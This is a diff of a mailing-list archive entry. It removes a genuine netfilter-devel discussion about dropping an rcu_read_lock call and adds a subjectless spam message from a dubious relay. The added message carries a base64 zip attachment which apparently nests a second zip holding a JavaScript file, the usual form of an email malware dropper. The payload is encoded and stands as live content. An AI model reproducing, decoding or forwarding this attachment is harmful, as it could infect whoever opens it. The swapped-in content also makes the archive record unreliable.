@@ -1,52 +1,80 @@
-From: Taehee Yoo <ap420073@gmail.com>
-Subject: Re: [PATCH V2] netfilter: Remove duplicated rcu_read_lock.
-Date: Wed, 21 Jun 2017 00:32:57 +0900
-Message-ID: <CAMArcTUwfLAMPFvZpX5FBbWkteOXRd_7e7VmvYGxK4EvvTQ_7Q@mail.gmail.com>
-References: <20170605152125.24978-1-ap420073@gmail.com> <20170619180449.GA19139@salvia>
+From: <roeper@stadt-wittenburg.de>
+Subject: (unknown)
+Date: Tue, 20 Jun 2017 18:45:56 -0000
+Message-ID: <149798435650.8929.3760829255439741947@surnet.ru>
 Mime-Version: 1.0
-Content-Type: text/plain; charset="UTF-8"
-Cc: Julian Anastasov <ja@ssi.bg>,
-        Netfilter Developer Mailing List
-        <netfilter-devel@vger.kernel.org>
-To: Pablo Neira Ayuso <pablo@netfilter.org>
+Content-Type: application/zip; name="4870601.zip"
+Content-Transfer-Encoding: base64
+To: <netfilter-devel@vger.kernel.org>
 Return-path: <netfilter-devel-owner@vger.kernel.org>
-Received: from mail-yb0-f196.google.com ([209.85.213.196]:34400 "EHLO
-        mail-yb0-f196.google.com" rhost-flags-OK-OK-OK-OK) by vger.kernel.org
-        with ESMTP id S1751144AbdFTPc7 (ORCPT
-        <rfc822;netfilter-devel@vger.kernel.org>);
-        Tue, 20 Jun 2017 11:32:59 -0400
-Received: by mail-yb0-f196.google.com with SMTP id b63so6506568yba.1
-        for <netfilter-devel@vger.kernel.org>; Tue, 20 Jun 2017 08:32:58 -0700 (PDT)
-In-Reply-To: <20170619180449.GA19139@salvia>
+Received: from ip-188-18-23-29.dsl.surnet.ru ([188.18.23.29]:60186 "HELO
+        surnet.ru" rhost-flags-OK-FAIL-OK-FAIL) by vger.kernel.org with SMTP
+        id S1751798AbdFTSqA (ORCPT <rfc822;netfilter-devel@vger.kernel.org>);
+        Tue, 20 Jun 2017 14:46:00 -0400
+Content-Disposition: attachment
+Subject: 
 Sender: netfilter-devel-owner@vger.kernel.org
 List-ID: <netfilter-devel.vger.kernel.org>
 
-2017-06-20 3:04 GMT+09:00 Pablo Neira Ayuso <pablo@netfilter.org>:
-> On Tue, Jun 06, 2017 at 12:21:25AM +0900, Taehee Yoo wrote:
->> diff --git a/net/netfilter/nfnetlink_queue.c b/net/netfilter/nfnetlink_queue.c
->> index 8a0f218..bb27e99 100644
->> --- a/net/netfilter/nfnetlink_queue.c
->> +++ b/net/netfilter/nfnetlink_queue.c
->> @@ -928,7 +928,6 @@ static unsigned int nfqnl_nf_hook_drop(struct net *net)
->>       unsigned int instances = 0;
->>       int i;
->>
->> -     rcu_read_lock();
->>       for (i = 0; i < INSTANCE_BUCKETS; i++) {
->>               struct nfqnl_instance *inst;
->>               struct hlist_head *head = &q->instance_table[i];
->> @@ -938,7 +937,6 @@ static unsigned int nfqnl_nf_hook_drop(struct net *net)
->>                       instances++;
->>               }
->>       }
->> -     rcu_read_unlock();
->>
->>       return instances;
->>  }
->
-> This is called from nfqnl_rcv_dev_event(), are you sure we can get rid
-> of this rcu read lock ?
-
-I'm sorry, I couldn't find code that nfqnl_rcv_dev_event() calls
-nfqnl_nf_hook_drop().
-Could you please tell me where I can find that code?
+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
